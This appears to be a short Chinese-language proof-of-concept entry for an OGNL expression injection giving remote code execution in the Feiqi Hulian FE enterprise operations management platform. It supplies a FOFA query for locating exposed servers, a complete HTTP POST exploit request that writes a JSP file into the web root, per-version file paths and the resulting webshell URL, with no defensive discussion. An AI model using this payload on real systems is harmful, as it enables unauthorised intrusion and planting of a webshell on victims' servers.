## 飞企互联Ognl表达式注入导致RCE

## fofa
```
app="飞企互联-FE企业运营管理平台"
```

## poc
```
POST /common/common_sort_tree.jsp;.js HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: gzip, deflate
Content-Length: 174
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded

rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../server/default/deploy/fe.war/123.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("d2hvYW1p"))%25}
```

## 版本文件路径
6.6
```
../web/fe.war/123.jsp
```
6.0
```
../server/default/deploy/fe.war/123.jsp
```

shell: http://xx.xx.xx.xx/123.jsp;
